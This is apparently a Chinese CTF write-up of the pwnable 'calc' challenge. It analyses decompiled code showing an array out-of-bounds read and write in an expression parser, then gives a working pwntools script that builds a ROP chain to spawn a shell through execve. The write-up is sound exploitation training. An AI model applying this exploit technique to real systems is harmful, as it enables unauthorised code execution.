---
title: calc
description: pwnable | ROP
---
<!--more--> 

##题目考点

 - 数组越界访问
 - ROP


##解题思路

  进入ida进行程序逻辑分析，发现如下数组越界漏洞从而实现任意地址写:

```c
unsigned int calc()
{
  int v1; // [esp+18h] [ebp-5A0h]         //v2[0 - 1]
  int v2[100]; // [esp+1Ch] [ebp-59Ch]    //int v2[100]
  char s; // [esp+1ACh] [ebp-40Ch]        //(char)s[400], (int)s[100]
  unsigned int v4; // [esp+5ACh] [ebp-Ch] //canary

  v4 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(&s, 0x400u);
    if ( !get_expr((int)&s, 1024) )       //通过get_expr函数读取中缀表达式到 int s[100]
      break;
    init_pool(&v1);                       //将栈v1清零
    if ( parse_expr(&s, &v1) )            //vulnerable
    {
      printf((const char *)&unk_80BF804, v2[v1 - 1]);   //可泄露任意地址
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v4;
}
```

```c
signed int __cdecl parse_expr(int a1, _DWORD *a2)
{
  int v2; // ST2C_4
  int v4; // eax
  int v5; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int v7; // [esp+28h] [ebp-80h]
  char *s1; // [esp+30h] [ebp-78h]
  int v9; // [esp+34h] [ebp-74h]
  char s[100]; // [esp+38h] [ebp-70h]
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  v5 = a1;
  v7 = 0;
  bzero(s, 0x64u);
  for ( i = 0; ; ++i )
  {

//0x01
    if ( (unsigned int)(*(char *)(i + a1) - 48) > 9 )
    {
      v2 = i + a1 - v5;
      s1 = (char *)malloc(v2 + 1);
      memcpy(s1, v5, v2);
      s1[v2] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
      v9 = atoi(s1);
      if ( v9 > 0 )
      {

//0x02
        v4 = (*a2)++;
        a2[v4 + 1] = v9;
      }
      if ( *(_BYTE *)(i + a1) && (unsigned int)(*(char *)(i + 1 + a1) - 48) > 9 )
      {
        puts("expression error!");
        fflush(stdout);
        return 0;
      }
      v5 = i + 1 + a1;
      if ( s[v7] )
      {
        switch ( *(char *)(i + a1) )
        {
          case 37:
          case 42:
          case 47:
            if ( s[v7] != 43 && s[v7] != 45 )
            {
              eval(a2, s[v7]);
              s[v7] = *(_BYTE *)(i + a1);
            }
            else
            {
              s[++v7] = *(_BYTE *)(i + a1);
            }
            break;
          case 38:
          case 39:
          case 40:
          case 41:
          case 44:
          case 46:
            eval(a2, s[v7--]);
            break;
          case 43:
          case 45:
            eval(a2, s[v7]);
            s[v7] = *(_BYTE *)(i + a1);
            break;
        }
      }
      else
      {
        s[v7] = *(_BYTE *)(i + a1);
      }
      if ( !*(_BYTE *)(i + a1) )
        break;
    }
  }
  while ( v7 >= 0 )
    eval(a2, s[v7--]);
  return 1;
}
```

在parse_expr()函数中，0x01处进行条件判断，每读到一个非数字，就对该 符号||'\0' 之前的数字进行运算入栈操作，在0x02处，发现\*a2(即为calc()函数中的v1)的值在程序中作为操作数 数 参与运算;
进一步发现，程序允许输入形如"+123"格式的表达式，此时calc函数中v1的值为1;

```c
_DWORD *__cdecl eval(_DWORD *a1, char a2)
{
  _DWORD *result; // eax

  if ( a2 == 43 )
  {
    a1[*a1 - 1] += a1[*a1];
/*注意此处，若*a1传入值为1，则可以改变*a1的值，进而实现数组越界任意地址写漏洞*/

  }
  else if ( a2 > 43 )
  {
    if ( a2 == 45 )
    {
      a1[*a1 - 1] -= a1[*a1]; //此处同理
    }
    else if ( a2 == 47 )
    {
      a1[*a1 - 1] /= a1[*a1];
    }
  }
  else if ( a2 == 42 )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```

  经过上述分析，发现输入形如"+x"的表达式，calc函数会输出[$ebp - (0x5A0/4) + x] (因为int占4个字节) 的值，而"+x+y"可以改变该地址的值，从而实现任意地址读写;

  在此基础上构造ROP链;

##exploit

```py
from pwn import *

p = process("./calc")

p.recvuntil(b'=== Welcome to SECPROG calculator ===\n')
p.sendline(b'+360')
#analyze the stack in gdb
old_ebp = int(p.recvline().decode().replace("\n","")) & 0xffffffff
pdcb  = 0x080701d0
pa    = 0x0805c34b
int80 = 0x08049a21

rop_chain = [pdcb, 0, 0, old_ebp - 2**32, pa, 0xb, int80, u32(b'/bin'), u32(b'/sh\x00')]
for i in range(len(rop_chain)):
  p.sendline(b'+' + str(361 + i).encode())
  temp = int(p.recvline().decode().replace("\n","")) & 0xffffffff
  if (rop_chain[i] > temp):
    p.sendline(b'+' + str(361 + i).encode() + b'+' + str(rop_chain[i] - temp).encode())
    p.recvline()
  else:
    p.sendline(b'+' + str(361 + i).encode() + str(rop_chain[i] - temp).encode())
    p.recvline()


p.interactive()
```